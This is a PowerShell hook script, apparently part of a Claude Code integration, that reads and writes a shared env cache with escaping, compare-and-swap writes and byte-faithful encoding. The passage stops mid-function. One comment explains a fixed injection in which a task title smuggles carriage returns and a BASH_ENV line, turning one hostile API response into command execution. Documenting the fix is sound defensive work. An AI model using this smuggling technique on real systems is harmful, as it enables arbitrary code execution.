# stride-hook.ps1 — Bridges Claude Code hooks to Stride .stride.md hook execution
#
# PowerShell companion to stride-hook.sh for Windows compatibility.
# Called by Claude Code's PreToolUse/PostToolUse hooks (configured in hooks.json).
# Receives hook JSON on stdin, determines if the Bash command is a Stride API call,
# and if so, parses and executes the corresponding .stride.md section.
#
# Usage: echo '{"tool_input":{"command":"curl ..."}}' | pwsh stride-hook.ps1 <pre|post>
#
# Exit codes:
#   0 — Success (or not a Stride API call)
#   2 — Hook command failed (blocks the tool call in PreToolUse context)

Set-StrictMode -Version Latest
$ErrorActionPreference = 'Stop'

# --- Arguments and paths ---
$Phase = if ($args.Count -gt 0) { $args[0] } else { '' }
$ProjectDir = if ($env:CLAUDE_PROJECT_DIR) { $env:CLAUDE_PROJECT_DIR } else { '.' }
$StrideMd = Join-Path $ProjectDir '.stride.md'
$EnvCache = Join-Path $ProjectDir '.stride-env-cache'
# (D226) Whether THIS call's own response proved the task identity, and the id
# it proved. Mirrors stride-hook.sh's TASK_IDENTITY_REFRESHED / TASK_OWNER_ID.
# Declared here because Set-StrictMode makes reading an unset variable an
# error, and the gate is read on every before_doing route whether or not the
# claim block set it.
$script:TaskIdentityRefreshed = $false
$script:TaskOwnerId = ''
# (D228) Whether the most recent Invoke-StrideSection actually executed
# commands. A section with no commands returns 0 too, and callers that treat
# "exit 0" as "it ran and passed" get that wrong — see the after_goal marker.
$script:LastSectionRanCommands = $false

# (W2100) The snapshot base judgment, memoized once per process — mirror of the
# bash twin's SNAP_BASE_RESOLVED_DONE. Invoke-FinalizeAfterDoing runs twice per
# completion (once before the section's commands for the W1095 early upload,
# once after), and re-deriving the base the second time could pick up a
# different answer mid-run. The capture itself still re-runs per call, exactly
# as bash's does; it is only the JUDGMENT that is fixed.
# Declared here because Set-StrictMode makes reading an unset variable an error.
$script:SnapBaseResolvedDone = $false
$script:SnapBaseResolved = ''
$script:SnapBaseRefused = $false

# (W2100) Sentinel a range list carries when a task provably made no commits of
# its own. Mirrors stride-hook.sh's __stride_no_own_commits__ — Expand-OwnRanges
# must skip it rather than feed it to git as a revision.
$script:StrideNoOwnCommits = '__stride_no_own_commits__'

# (W2102/D255) Sentinel an owned-set record carries when the loop delta held
# more commits than the cap. Distinct from empty: empty means "the loop authored
# nothing", OVERFLOW means "too many to name", and the two take DIFFERENT paths
# in the classifier — empty falls back to the D244 purity heuristic, OVERFLOW
# does too, but for the opposite reason (a truncated list would mis-subtract).
$script:StrideOwnedOverflow = 'OVERFLOW'

# (W2102/D255) The after_doing loop delta, and the once-per-completion guards
# around recording it. Declared here because Set-StrictMode makes reading an
# unset variable an error.
$script:SnapOwnedH0 = ''
$script:SnapOwnedH1 = ''
$script:SnapOwnedLoopRan = $false
$script:SnapOwnedRecorded = $false
$script:SnapOwnedSet = ''
# (W2102) The attributed ranges, computed once with the base so the pre-loop and
# post-loop captures classify identically - the ordering bash uses.
$script:SnapOwnRanges = ''

# (W2103/D274) The open-window sweep threshold. Below this many open windows the
# sweep runs no git at all and proves nothing dead, so an ordinary cache pays
# nothing. This is NOT a cap: open windows are never evicted by count.
$script:StrideOpenWindowSweepAt = 20

# (D226) Atomic env-cache write, mirroring the bash twin's write_env_cache.
# Every truncating write goes through here so no reader can observe a partial
# cache. The temp is staged in .stride/ — already hard-excluded from capture
# and from project gitignores, unlike a sibling .stride-env-cache.XXXX — and
# on the same filesystem, so Move-Item is a rename. On any failure the
# PREVIOUS cache survives, and the failure is announced rather than swallowed.
#
# One host caveat, stated because it is easy to verify on the wrong one:
# stride-hook.sh execs `powershell.exe` (Windows PowerShell 5.1), not `pwsh`.
# .NET Framework has no File.Move(src, dst, overwrite), so 5.1 implements
# `-Force` as delete-then-move. "Never partial" still holds there — a reader
# sees the old cache or none — but "never absent" does not: a crash inside
# that window leaves no cache, which degrades safely to the HEAD~1 fallback.
# THE RECORD DEFINITION — which executor wins, per axis (D281)
#
# stride-hook.sh and stride-hook.ps1 share one .stride-env-cache in a mixed
# checkout, and it anchors snapshot bases and window attribution. They disagreed
# about what a record IS and what one SAYS. This is the ruling, made once, so the
# divergences are not patched separately and left to drift apart again.
#
#   LINE TERMINATORS — bash wins. A record ends at LF and only at LF; a lone CR
#   and a CRLF are data inside a line, never terminators. Already true since
#   W2101. D281 adds that the BYTES of such a value survive an unrelated write.
#
#   ENCODING SIGNATURE — bash wins. The cache is a byte stream with no declared
#   encoding. A BOM is three data bytes on the first line, not a marker: it is
#   preserved, never emitted, and never re-encoded. THE STORAGE PROJECTION above
#   is what makes that literal rather than aspirational; UTF-8 is the
#   interpretation applied only at the process-environment boundary.
#
#   MULTI-LINE VALUES — bash wins for the FILE FORMAT, the ps1 for ITS OWN
#   WRITES, and this asymmetry is deliberate and permanent. A quoted value may
#   legally span physical lines and `source` reassembles it, so both READERS
#   honour that. But the ps1's own writers flatten, because ConvertTo-FlatEnvValue
#   is one of the two halves that closed D280's BASH_ENV route, and its class is
#   wider than CR/LF (NEL, LS, PS) because .NET and PowerShell readers honour
#   terminators bash does not. This is a CONTENT divergence, not a PRESENCE one:
#   both readers present a TASK_TITLE either way, only the newlines differ.
#
# What this ruling does NOT cover, named so its absence is not read as coverage:
# the double-quote and '#' gap in Split-EnvCacheRecord and in bash's awk scanner,
# which both document as deliberate — closing it on one side alone would
# manufacture the very divergence this layer exists to prevent.
#
# WHERE EACH FILED DIVERGENCE IS NOW PINNED. The session that filed D281 listed
# four, and that session is not re-derivable, so the map lives here instead — it
# is the only way a later reader can audit the "present to one, present to the
# other" criterion from the code:
#
#   1 continuation line promoted to a record  -> closed by D280 r3; the loader
#     reads Split-EnvCacheRecord.Records, not physical lines. Pinned by the
#     23-series loader cases, notably 23j ("the whole record goes, interior
#     included - no promotion") and the BASH_ENV promotion block beside it.
#     NOT 22h4 — that is the CRLF/writer case below.
#   2 a CR destroyed by an unrelated write     -> 22h4 ("an unrelated write does
#     not promote a CRLF line" and "the CR survives the rewrite byte-faithfully").
#   4 bash EXECUTING a BOM-prefixed cache line -> reader half closed; 22h3 has
#     both executors call a BOM-prefixed record absent. The numbering follows
#     the task's own security_considerations, which name the BOM case as
#     divergence 4 — do not renumber it to close the gap below.
#
#   Divergence 3 is NOT recoverable from any surviving record. The session that
#   enumerated the four is gone, and neither the task text nor the in-source
#   comments name it. Left as a gap rather than guessed at, because a map whose
#   whole purpose is auditing criterion 4 is worse than useless if one row is
#   invented.
#
#   The invalid-byte class — destroyed by a rewrite — is what THIS change
#   closes. It is the residue the source called the D281 root cause rather than
#   one of the four numbered divergences. 22h5 and 22h6b pin the ps1 side;
#   22h6c pins it across both executors on one shared cache.
#
# The bash side is UNCHANGED by this ruling. Both axes that could have obliged it
# resolve to no-change, and each is recorded at its site in stride-hook.sh rather
# than left as an absence a later reader would have to guess about.

# (D282) The cache's raw bytes, or $null when it does not exist. This is the
# fingerprint the compare-and-swap below is taken against: comparing CONTENT
# rather than a timestamp, because the writers stage-and-rename within the same
# second routinely and a coarse mtime would miss it. The cache is small — the
# comparison is cheaper than the write it guards.
function Get-EnvCacheRawByte {
    try {
        $p = $ExecutionContext.SessionState.Path.GetUnresolvedProviderPathFromPSPath($EnvCache)
        # ABSENT and NOT-A-FILE are different answers, and conflating them was a
        # regression this change introduced. -PathType Leaf is false for a
        # DIRECTORY, so a directory at the cache path reported absent; the swap
        # then matched "expected absent", Move-Item relocated the staged temp
        # INTO the directory, and Set-TaskRecord returned success over a cache
        # that does not exist as a file — stranding a copy carrying TASK_*
        # identity lines at an unintended path. The pre-D282 code failed SAFE
        # here (Test-Path with no -PathType is true for a container, the
        # splitter threw, and the write refused); this failed success-shaped,
        # which is the very shape D282 exists to close.
        if (-not (Test-Path -LiteralPath $p)) { return $null }
        if (-not (Test-Path -LiteralPath $p -PathType Leaf)) { return 'unreadable' }
        # The unary comma is load-bearing. PowerShell unrolls a returned array
        # into the pipeline, so a ZERO-BYTE cache would come back as $null —
        # indistinguishable from an absent one, and a swap taken against
        # "expected absent" would then commit over a 0-byte file another process
        # had just created. Write-EnvCache -Lines @() produces exactly that
        # state, so it is reachable rather than theoretical. Wrapping keeps the
        # empty byte[] an empty byte[].
        return ,([System.IO.File]::ReadAllBytes($p))
    } catch {
        # Unreadable is NOT the same as absent, and must not be reported as it:
        # returning $null here would let a swap succeed against "expected
        # absent" when the file is simply locked by another process.
        return 'unreadable'
    }
}

# (D282) Byte equality for the compare-and-swap. $null means "expected absent".
function Test-EnvCacheUnchanged {
    param($Expected, $Actual)
    if ($Expected -is [string] -or $Actual -is [string]) { return $false }  # 'unreadable' sentinel
    if ($null -eq $Expected -and $null -eq $Actual) { return $true }
    if ($null -eq $Expected -or $null -eq $Actual) { return $false }
    if ($Expected.Length -ne $Actual.Length) { return $false }
    for ($i = 0; $i -lt $Expected.Length; $i++) {
        if ($Expected[$i] -ne $Actual[$i]) { return $false }
    }
    return $true
}

function Write-EnvCache {
    param([string[]]$Lines, $ExpectBytes, [switch]$CompareAndSwap)
    $stageDir = Join-Path $ProjectDir '.stride'
    $tmp = ''
    try {
        if (-not (Test-Path $stageDir)) {
            New-Item -ItemType Directory -Path $stageDir -Force -ErrorAction Stop | Out-Null
        }
        $tmp = Join-Path $stageDir ("env-cache." + [System.IO.Path]::GetRandomFileName())
        # (W2101) TWO byte-level divergences on Windows PowerShell 5.1 — the
        # interpreter stride-hook.sh execs — both invisible to every pwsh-7 test
        # and both breaking the same cross-executor promise:
        #
        #   BOM — Set-Content -Encoding UTF8 is BOM-less under pwsh 7 but
        #     BOM-prefixed under 5.1, which makes the FIRST line's key
        #     unmatchable to bash's `^KEY=` and garbled when sourced.
        #   CRLF — WriteAllLines terminates with Environment.NewLine, which is
        #     CRLF under 5.1. bash's read_task_record shape check `^KEY='...'$`
        #     then fails on the trailing CR, and worse, a SOURCED value keeps it:
        #     TASK_BASE_REF becomes "<sha>`r" and is handed to git that way.
        #
        # So the terminator is written explicitly as LF rather than left to the
        # platform. Byte-identical to the previous behaviour under pwsh 7 on
        # POSIX, so nothing already asserted moves.
        # (D281) A character above U+00FF means this line never passed its IN
        # boundary: ISO-8859-1 would encode it as '?' (0x3F), silently corrupting
        # it. Refuse the whole write and keep the previous cache — the contract
        # this function already keeps on every other failure. Deliberately NOT
        # auto-repaired: 'every char <= U+00FF' cannot distinguish an already
        # converted byte-string from an unconverted 'café', so a repair would
        # corrupt the legitimate case. Only the KEY is named; the value may carry
        # task text.
        if ($Lines) {
            foreach ($_l in @($Lines)) {
                if ($null -eq $_l) { continue }
                foreach ($_c in $_l.ToCharArray()) {
                    if ([int]$_c -gt 0xFF) {
                        $_eq = $_l.IndexOf('=')
                        $_key = if ($_eq -gt 0) { $_l.Substring(0, $_eq) } else { '<unkeyed line>' }
                        [Console]::Error.WriteLine('stride-hook: refusing an env-cache write; a line was not projected to the cache byte-string: ' + (ConvertTo-PrintableForLog -Value $_key))
                        return $false
                    }
                }
            }
        }
        $joined = ''
        if ($Lines -and @($Lines).Count -gt 0) { $joined = (@($Lines) -join "`n") + "`n" }
        # Resolve to an ABSOLUTE path before handing it to the .NET API. The
        # provider cmdlets around this line (Test-Path, Move-Item, Remove-Item)
        # resolve against PowerShell's location, while [System.IO.File]::*
        # resolves against [Environment]::CurrentDirectory, which Set-Location
        # does NOT update — and Invoke-StrideSection does Set-Location $ProjectDir
        # before a before_doing capture reaches here. With a relative
        # CLAUDE_PROJECT_DIR the two would disagree: the temp lands outside the
        # intended tree, Move-Item cannot find it, and the cleanup misses it too,
        # stranding a file containing the whole env cache somewhere unintended.
        $tmpFull = $ExecutionContext.SessionState.Path.GetUnresolvedProviderPathFromPSPath($tmp)
        # (D281) ISO-8859-1, matching Get-EnvCacheLine — see THE STORAGE PROJECTION.
        [System.IO.File]::WriteAllText($tmpFull, $joined, [System.Text.Encoding]::GetEncoding(28591))
        # (D282) COMPARE AND SWAP, immediately before the rename and after the
        # temp is fully staged, so the window between the check and the commit
        # is one Move-Item rather than a read, a filter and a file write.
        #
        # This narrows the race; it does not make the write atomic, and saying
        # so plainly matters more than the fix does. A writer landing between
        # this check and the Move-Item is still lost. What it removes is the
        # wide window W2102 opened, where Invoke-FinalizeAfterDoing holds a read
        # across Build-ChangedFilesSnapshot — a git shell-out — and then commits
        # against it.
        #
        # A lock was the alternative and was rejected for this task: FileShare
        # on the ps1 side cannot coordinate with a concurrent BASH writer in a
        # mixed checkout, which is the case that motivated the defect, and 5.1's
        # Move-Item -Force is a non-atomic delete-then-move, so a lock design
        # risks introducing an absent-cache window that does not exist today.
        if ($CompareAndSwap) {
            $nowBytes = Get-EnvCacheRawByte
            if (-not (Test-EnvCacheUnchanged -Expected $ExpectBytes -Actual $nowBytes)) {
                if ($tmp -and (Test-Path $tmp)) { Remove-Item -Force -LiteralPath $tmp -ErrorAction SilentlyContinue }
                return 'changed'
            }
        }
        Move-Item -LiteralPath $tmp -Destination $EnvCache -Force -ErrorAction Stop
        return $true
    } catch {
        if ($tmp -and (Test-Path $tmp)) {
            Remove-Item -Force -LiteralPath $tmp -ErrorAction SilentlyContinue
        }
        [Console]::Error.WriteLine('stride-hook: could not commit an env-cache write; keeping the previous cache')
        return $false
    }
}
# (D289) The compare-and-swap RETRY, generalized out of Set-TaskRecord.
#
# D282 gave Set-TaskRecord this loop and left the other five Write-EnvCache
# callers committing a whole-file replace against whatever they read whenever
# they happened to read it. That closed one direction of the race and left the
# reverse open: a claim-side or finalize-side rewrite could still discard a
# record write committed inside ITS window. The loop is the same either way,
# so it lives here once rather than being copied five more times - the drift
# cost of copied guards is the lesson D288 wrote down two defects ago.
#
# $Build is invoked once per attempt with the fingerprint of the cache as it
# was read for THAT attempt, and must return the complete replacement line set.
# Re-invoking it is what makes a retry a fix rather than a repeat: the second
# attempt re-reads and re-applies its filter against the CONCURRENT writer's
# content, not against our stale snapshot.
#
# THE $Build IS AN UNBOUND SCRIPTBLOCK, so its free variables resolve up the
# DYNAMIC chain - through THIS function's frame before reaching the caller's.
# A local added here can therefore silently capture a name a Build reads. It is
# correct as written: no Build reads any of $attempt, $before, $newArr, $built,
# $rc, $nowBytes, $What, $Build or $DeleteWhenEmpty as a free variable. The
# exposed names are the read-only free reads - $Key/$Value, $taskJson,
# $written/$cacheLines/$AlsoDropPattern, and $baseRef/$owner/$ownerKey - and NOT
# $kept/$records/$preserved, which every Build assigns before use and so
# shadows. Before adding a local here, check that list.
#
# A $Build REFUSES BY THROWING, never by returning nothing. That is not a style
# choice: PowerShell unrolls a returned array, so a Build returning @() arrives
# here as $null, indistinguishable from a Build that returned nothing on
# purpose - and one of the callers is the claim branch whose EMPTY result means
# "delete the cache". Reading that as a refusal would have made the delete
# unreachable. Throwing is also what the callers already did before D289, each
# with its own `throw 'env cache ends inside a quoted value'` landing in an
# enclosing catch, so the contract is the one they were written against.
#
# -DeleteWhenEmpty is for the one caller whose empty result means "remove the
# cache" rather than "write nothing": the claim block's unparseable-response
# branch. That delete is fingerprint-checked here rather than left bare, since
# an unguarded Remove-Item discards a concurrent write more completely than any
# rewrite does.
#
# One unguarded Remove-Item REMAINS, and saying so here keeps the sentence
# above from overclaiming: the after_review lifecycle cleanup removes the cache
# outright. It is deliberately left alone - it yields an ABSENT cache rather
# than an older task's identity, both cache-TASK_ID consumers no-op when
# TASK_ID is unset, and an in-flight claim carries its own swap - so it is not
# a reversion vector. Named rather than silently excepted.
function Invoke-EnvCacheRewrite {
    param(
        [scriptblock]$Build,
        [string]$What = 'the env cache',
        [switch]$DeleteWhenEmpty
    )
    $attempt = 0
    while ($true) {
        $attempt++
        $before = Get-EnvCacheRawByte
        if ($before -is [string]) {
            # 'unreadable' - the file exists but could not be read. Refuse
            # rather than treat it as absent, for the reason Set-TaskRecord
            # states at length: both executors rewrite the WHOLE file, so
            # reading an unreadable cache as empty drops every other record.
            [Console]::Error.WriteLine("stride-hook: could not read the env cache to rewrite $What; leaving the cache untouched")
            return $false
        }
        $newArr = $null
        try {
            $built = & $Build $before
            # (D289) Explicit, not `@($built)` alone. A scriptblock that emits
            # nothing yields $null here, and @($null) is a ONE-element array
            # holding $null on some hosts - which would make -DeleteWhenEmpty
            # never fire and write a blank cache where the claim branch means to
            # remove the file. Nothing executes this script under
            # powershell.exe 5.1 (the shipping host, per pitfall 3), so the
            # semantic is not one to take on trust from a pwsh 7 green run.
            if ($null -eq $built) { $newArr = @() } else { $newArr = @($built) }
        } catch {
            # The Build's own guard said no. Refuse the write outright: no
            # further attempts, previous cache untouched.
            # (D289) Diagnosed, not silent. Set-TaskRecord's own catch warned
            # here before the loop moved, and a refusal nobody can see is the
            # shape these defects keep being about.
            [Console]::Error.WriteLine("stride-hook: could not build the env-cache rewrite for $What; leaving the cache untouched")
            return $false
        }
        if ($DeleteWhenEmpty -and $newArr.Count -eq 0) {
            $nowBytes = Get-EnvCacheRawByte
            if (-not (Test-EnvCacheUnchanged -Expected $before -Actual $nowBytes)) {
                if ($attempt -ge 3) {
                    [Console]::Error.WriteLine("stride-hook: the env cache changed under $What on every attempt; leaving the concurrent write in place")
                    return $false
                }
                continue
            }
            Remove-Item -Force -LiteralPath $EnvCache -ErrorAction SilentlyContinue
            return $true
        }
        $rc = Write-EnvCache -Lines $newArr -ExpectBytes $before -CompareAndSwap
        if ($rc -is [string] -and $rc -eq 'changed') {
            if ($attempt -ge 3) {
                # Refuse rather than clobber - three collisions is a writer we
                # cannot keep up with, and overwriting its work is the exact
                # loss this defect is about.
                [Console]::Error.WriteLine("stride-hook: the env cache changed under $What on every attempt; leaving the concurrent write in place")
                return $false
            }
            continue
        }
        return [bool]$rc
    }
}

# ============================================================================
# (W2101) The PER-TASK RECORD layer — the data half of the window/attribution
# subsystem. Five families: TASK_BASE_REF, TASK_HEAD_REF, TASK_OWNED,
# TASK_BASE_AT, TASK_NARROWED.
#
# Before this, only TASK_BASE_REF existed here, and only as an inline env read.
# The other four appeared solely as string filters in the env FENCE, so nothing
# on this side could read or write them and the later G413 children had nowhere
# to persist a verdict.
#
# (W2102) THIS LAYER NOW HAS PRODUCTION CALL SITES - four of them, inventoried by test 22r. It shipped in W2101 with none, which is what the rest of this header describes:
# deciding WHEN to write a record is the orchestration (attributed_commit_ranges,
# compute_owned_set, another_open_window_exists, replay_narrowing_decision),
# which is explicitly out of scope. Writing a record at a moment bash does not
# would make the two executors' caches diverge in CONTENT — strictly worse than
# the current absence, since the same cache is written by one executor and read
# by the other in a mixed checkout.
#
# TWO ASYMMETRIES ARE PORTED FAITHFULLY RATHER THAN TIDIED:
#  * TASK_BASE_REF and TASK_HEAD_REF are read from the ENVIRONMENT; the other
#    three go through Read-TaskRecord's file+shape check. Bash does exactly this
#    (task_base_ref_for / task_head_ref_for use indirect expansion). The env read
#    IS weaker — an exported variable can forge one, and absent and empty are
#    indistinguishable — but these two feed the orphan-base guard and the
#    snapshot-base resolution, so making this side stricter would have the two
#    executors disagree about whether a window is usable, in precisely the mixed
#    environment the pitfall is about. A known asymmetry for G413 to revisit on
#    both platforms at once, never on one.
#  * The delete filter on write is BROAD (`^KEY=`, any shape) while the read is
#    STRICT (`^KEY='...'$`). Bash is identical. That is what lets a write clean
#    up a malformed or forged line for its own key that a read would never have
#    honoured.
# ============================================================================

# Quote a value the way bash's sq_escape does, for a file bash SOURCES.
#
# Wrap in single quotes; render every embedded ' as the four characters '\''
# (close, escaped literal quote, reopen). Inside single quotes bash treats $,
# backtick and backslash as inert, so this is what makes a hostile value data
# rather than syntax — the whole of security consideration B.
#
# .Replace(), NOT -replace: -replace is regex and its REPLACEMENT string treats
# $ specially. "'\''" contains no $ so -replace would happen to work today, but
# a reader cannot see that at a glance and a later edit would not be safe.
function ConvertTo-ShSingleQuoted {
    param([string]$Value)
    return "'" + $Value.Replace("'", "'\''") + "'"
}

# Flatten every line terminator a reader of this cache might honour.
#
# (D280) THE ONE flattener, used by both server-fed write sites, so they cannot
# drift apart again. They already did: both used `-replace "`r?`n", ' '`, which
# requires an LF, so a LONE CARRIAGE RETURN passed straight through. Quoting
# made the value inert to bash — `source` is genuinely defended — but quoting is
# irrelevant to THIS port's own readers, and .NET's StreamReader.ReadLine (what
# Get-Content uses) treats a bare CR as a line terminator. One logical cache
# line therefore split into several records, and the bulk loader exported each
# one. Demonstrated end to end, not theorised: a title carrying
# `<CR>BASH_ENV=<attacker-controlled file><CR>` planted BASH_ENV, which
# non-interactive bash sources before running a section — arbitrary command
# execution from a single hostile API response. The next Write-EnvCache then
# re-joined the CR-split lines with LF, promoting the forgery to a real line.
#
# The class is deliberately wider than CR and LF. NEL, LINE SEPARATOR and
# PARAGRAPH SEPARATOR are line terminators to several .NET and PowerShell
# readers, and no legitimate value in this cache — ids, titles, SHAs, yes/no,
# epoch digits — has any business carrying one. Refusing the whole class costs
# nothing and removes the next variant of this bug rather than the one instance.
# (D281) THE STORAGE PROJECTION. This layer's [string] is a sequence of BYTES,
# not text. Get-EnvCacheLine decodes and Write-EnvCache encodes with ISO-8859-1
# (code page 28591), which is bijective over 0x00-0xFF, so a line read from disk
# and written back is byte-identical for ANY byte sequence — valid UTF-8,
# invalid UTF-8, NUL, BOM, lone CR. UTF-8 could not do that: its decoder's
# invalid-byte fallback is REPLACEMENT, so a byte that is not valid UTF-8 became
# U+FFFD on read and EF BF BD on write, destroying a record the writer was never
# asked to touch, while bash's byte-oriented `grep -v` left it alone.
#
# This is not an approximation of the bash semantics, it IS them: bash preserves
# bytes because grep, awk and printf operate on bytes, and Latin-1 makes a
# PowerShell string in this layer mean exactly what a bash line means. Every
# filter here keys off ASCII, and UTF-8 lead and continuation bytes are all
# >= 0x80, so no multibyte character can produce a byte in the ASCII set the
# regexes, -like tests, IndexOf calls and quote scanner use — which is why none
# of them needed changing.
#
# The cost is a boundary discipline, and it is the one thing this design can get
# wrong. A value that is TEXT must be projected before it becomes a cache line,
# and a value leaving the cache for the process environment must be projected
# back. A missed IN boundary on a value holding U+0080-U+00FF — 'café' is the
# case — silently writes one byte where bash writes two, and Write-EnvCache's
# guard cannot catch it because those characters are <= U+00FF.
#
# THE BOUNDARIES, enumerated so a reader can reconcile this comment against
# `grep ConvertTo-CacheByteString` and get the same answer — TWO sites project,
# and the rest are ASCII-constrained by construction:
#
#   IN, projecting (2):
#     - the claim identity block, folded into its $flat lambda so all six lines
#       get it. Server-supplied title and identifier routinely carry non-ASCII.
#     - Set-HookEnv, for the same reason: the values are server text.
#
#   IN, ASCII-only by construction, so no projection and none needed (2):
#     - Set-TaskRecord. Its callers pass only 'yes'/'no', a git SHA, a
#       space-joined SHA list or the OVERFLOW sentinel, and epoch digits.
#     - the finalize block: a rev-parse SHA, the literal '1', a digit-gated
#       owner id, and an epoch.
#     A future caller handing either of these free-form text MUST project it, or
#     it lands as Latin-1 bytes. That is the whole failure mode.
#
#   OUT, projecting (1):
#     - the bulk loader's SetEnvironmentVariable. Without it every non-ASCII
#       value reaches each section child as mojibake.
#
# The end-to-end tests assert the ON-DISK BYTES of a non-ASCII title rather than
# a round-trip, because a round-trip is symmetric and passes under any
# self-consistent-but-wrong encoding.
#
# The encoding is constructed inside each function rather than memoized in a
# $script: variable: hooks/test-stride-hook.ps1 extracts these functions by AST
# and dot-sources them individually, where a top-level assignment does not exist
# and Set-StrictMode makes reading it a terminating error.

# Text -> the byte-string this layer stores. Call at every IN boundary.
function ConvertTo-CacheByteString {
    param([string]$Value)
    if ($null -eq $Value -or $Value -eq '') { return '' }
    $utf8 = New-Object System.Text.UTF8Encoding($false)
    return [System.Text.Encoding]::GetEncoding(28591).GetString($utf8.GetBytes($Value))
}

# The stored byte-string -> text. Call at the OUT boundary only.
function ConvertFrom-CacheByteString {
    param([string]$Value)
    if ($null -eq $Value -or $Value -eq '') { return '' }
    $utf8 = New-Object System.Text.UTF8Encoding($false)
    return $utf8.GetString([System.Text.Encoding]::GetEncoding(28591).GetBytes($Value))
}

function ConvertTo-FlatEnvValue {
    param([string]$Value)
    return ($Value -replace '[\r\n\u0085\u2028\u2029]', ' ')
}

# The exact inverse of ConvertTo-ShSingleQuoted, for the bulk loader.
#
# (D280) bash gets unquoting FREE from `. "$ENV_CACHE"` — the shell strips the
# quoting as it parses. This port's loader is a line regex that sets the RHS
# verbatim, so once the writers quote, the loader MUST unquote or every consumer
# starts seeing a value wrapped in quotes. That is why the writer change and this
# one have to land together: either alone is a regression.
#
# NOT a .Trim("'"). Trimming is not the inverse of the escaper and gets three
# cases wrong: on 'a'\''b' it would strip only the outer pair and leave the
# interior \'' untouched, yielding a'\''b instead of a'b; on the empty value ''
# it collapses to nothing correctly by luck but for the wrong reason; and on a
# value that legitimately ENDS in a quote it eats a character of real data.
#
# A line with no surrounding quotes is returned verbatim. That is the
# back-compat arm and it is load-bearing: a cache written by a PRE-D280 ps1
# holds bare values, and this loader still has to read those. It also means a
# value that merely happens to start and end with a quote but was never escaped
# (only reachable from such a legacy cache) is unwrapped once — accepted,
# because the alternative is failing to read every legacy cache, and the five
# constrained record families cannot carry a quote at all.
function ConvertFrom-ShSingleQuoted {
    param([string]$Value)
    if ($Value.Length -lt 2) { return $Value }
    if ($Value[0] -ne "'" -or $Value[$Value.Length - 1] -ne "'") { return $Value }
    return $Value.Substring(1, $Value.Length - 2).Replace("'\''", "'")
}

# Build a per-task record key, or return '' to REFUSE.
#
# Mirror of bash's task_record_key, step for step and in the same order:
# digits-only id gate, sanitize, reject the reserved control-flag suffixes,
# concatenate. This is the single choke point D269 asked for — before it, the
# same three steps were copied inline in two places on this side.
#
# The sanitize step is redundant behind a digits-only gate and is kept anyway,
# exactly as bash keeps its `tr`, as insurance for the day that rule widens.
# Note PowerShell's -match is case-INSENSITIVE where bash's `case` is not, so
# the reserved check here refuses a superset; it can never build a key bash
# would refuse to build. (A lowercase 'trusted' is not digits-only anyway, so
# the branch is unreachable — stated rather than "fixed" with -cmatch, which
# would read as a correction to a bug that does not exist.)
function Get-TaskRecordKey {
    param([string]$Prefix, [string]$TaskId)
    # \z, not $: .NET's $ ALSO matches immediately before a trailing newline,
    # so "42`n" would pass here and build TASK_BASE_REF_42_ where bash's
    # `case *[!0-9]*` refuses outright and builds no key. The id is
    # server-supplied, and this is the one function whose job is byte-for-byte
    # fidelity with that gate.
    if ($TaskId -notmatch '^[0-9]+\z') { return '' }
    $sanitized = $TaskId -replace '[^A-Za-z0-9_]', '_'
    if ($sanitized -match '^(TRUSTED|OWNER|UNPROVEN)\z') { return '' }
    return $Prefix + $sanitized
}

function Get-TaskBaseRefKey  { param([string]$TaskId) return (Get-TaskRecordKey -Prefix 'TASK_BASE_REF_'  -TaskId $TaskId) }
function Get-TaskHeadRefKey  { param([string]$TaskId) return (Get-TaskRecordKey -Prefix 'TASK_HEAD_REF_'  -TaskId $TaskId) }
function Get-TaskOwnedKey    { param([string]$TaskId) return (Get-TaskRecordKey -Prefix 'TASK_OWNED_'     -TaskId $TaskId) }
function Get-TaskBaseAtKey   { param([string]$TaskId) return (Get-TaskRecordKey -Prefix 'TASK_BASE_AT_'   -TaskId $TaskId) }
function Get-TaskNarrowedKey { param([string]$TaskId) return (Get-TaskRecordKey -Prefix 'TASK_NARROWED_'  -TaskId $TaskId) }

# Read the env cache as bash sees it: raw bytes, split on LF, nothing stripped.
#
# (W2101) The ONE place either the reader or the writer below is allowed to turn
# the cache file into lines. Both used to do it their own way — the reader raw,
# the writer through Get-Content — and that split is a divergence generator, not
# a style inconsistency: .NET's line reader strips a trailing CR and treats a
# lone CR as a terminator, so a CRLF-terminated line that BOTH executors
# correctly call ABSENT (22h2) was silently normalised to LF by any write and
# became FOUND to both afterwards — the forged continuation promoted into a
# first-class record that the claim-branch comment at the bottom of this file
# warns against — while a value carrying a bare CR was split in two, unbalancing
# the quoting for bash's `source`. bash's `grep -v` is byte-faithful; so is this.
#
# ReadAllBytes + an explicit decode, NOT ReadAllText: every ReadAllText overload
# sets detectEncodingFromByteOrderMarks, which EATS a UTF-8 BOM. A cache written
# by a pre-fix stride-hook.ps1 under Windows PowerShell 5.1 (the legacy case
# Write-EnvCache documents) carries one, and eating it would make the FIRST line
# read as a clean KEY='value' here while bash's `^KEY=` sees the BOM bytes and
# reports ABSENT. Decoding the bytes verbatim keeps the BOM in the first line,
# so both executors agree it is not a record.
#
# BYTE FAITHFULNESS — the claim now holds for ALL bytes (D281).
# It used to hold only for VALID UTF-8: the decoder's invalid-byte fallback is
# replacement, so a byte sequence that was not valid UTF-8 decoded to U+FFFD and
# a Set-TaskRecord rewrite re-encoded it as EF BF BD, destroying a record the
# writer had not been asked to touch while bash's byte-oriented `grep -v` left it
# alone. That was the one byte class where this reader and bash disagreed.
#
# D281 closed it with the ISO-8859-1 storage projection described above
# ConvertTo-FlatEnvValue, which is bijective over 0x00-0xFF, so read-then-write
# is lossless for every byte sequence. It was NOT closed by throwing on invalid
# bytes: that would make one bad byte blind this reader to every record in the
# file while bash kept reading the valid ones — a NEW divergence, and the exact
# thing this function exists to prevent. 22h5 and 22h6b pin the closed invariant.
#
# Resolve to an ABSOLUTE path first, for the reason Write-EnvCache states at
# length: the provider cmdlets around this layer (Test-Path in Read-TaskRecord,
# Set-TaskRecord's guard) resolve against PowerShell's location, while
# [System.IO.File]::* resolves against [Environment]::CurrentDirectory, which
# Set-Location does NOT update — and Invoke-StrideSection does Set-Location
# $ProjectDir. With a relative CLAUDE_PROJECT_DIR the guard and the read would
# disagree about which file they are talking about.
#
# Throws are the caller's to handle: absent file, sharing violation, unreadable.
function Get-EnvCacheLine {
    $cachePath = $ExecutionContext.SessionState.Path.GetUnresolvedProviderPathFromPSPath($EnvCache)
    $bytes = [System.IO.File]::ReadAllBytes($cachePath)
    # (D281) ISO-8859-1, not UTF-8 — see THE STORAGE PROJECTION above.
